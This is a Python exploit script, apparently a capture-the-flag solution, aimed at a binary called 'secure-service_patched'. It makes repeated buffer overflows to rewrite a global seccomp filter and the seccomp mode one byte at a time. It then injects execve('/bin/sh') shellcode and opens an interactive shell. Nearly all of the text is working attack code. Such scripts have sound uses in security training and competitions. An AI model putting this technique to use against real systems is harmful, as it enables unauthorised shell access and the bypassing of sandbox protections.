#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn
import time

exe = ptr.ELF("./secure-service_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def asm(sc: list[str]) -> bytes:
    pl = ""
    for i in sc:
        pl += f"{i};"
    return pwn.asm(pl)


def main():
    io = connect()

    def do_bof(data: bytes):
        io.sendlineafter(b"method? ", b"bof")
        io.sendlineafter(b"payload: ", data)
        return

    seccomp_mode_offset = 0x4180
    filter_offset = 0x4100
    g_buf_offset = 0x4080

    payload = b""
    payload = payload.ljust(filter_offset - g_buf_offset, b"\0")
    payload += ptr.p64(0x0000010101000015)
    payload += ptr.p64(0x0000000000000006)
    payload += ptr.p64(0x7FFF000000000006)
    payload = payload.ljust(seccomp_mode_offset - g_buf_offset, b"\0")
    payload += ptr.p8(2)

    prev_bytes = b""
    for i in range(len(payload) - 1, -1, -1):
        byte = payload[i]
        if byte == 0:
            # i = 0xf
            # AAAAAAAA AAAAAAA
            do_bof(b"A" * i)
        else:
            # i = 0xf
            # AAAAAAAA AAAAAAAB
            # i = 0xe
            # AAAAAAAA AAAAAA0
            do_bof(b"A" * i + ptr.p8(byte) + prev_bytes)
        prev_bytes = ptr.p8(byte) + prev_bytes

    sc = []
    sc.append(f"mov rax, {hex(ptr.u64(b'/bin/sh'))}")
    sc.append(f"mov [rsp], rax")
    sc.append("mov rdi, rsp")
    sc.append("mov rsi, 0")
    sc.append("mov rdx, 0")
    sc.append("mov rax, 59")
    sc.append("syscall")
    payload = asm(sc)
    assert len(payload) < 0x80

    io.sendline(b"a")
    io.sendline(b"shellcode")
    io.sendlineafter(b"shellcode: ", payload)

    io.interactive()
    return


if __name__ == "__main__":
    main()
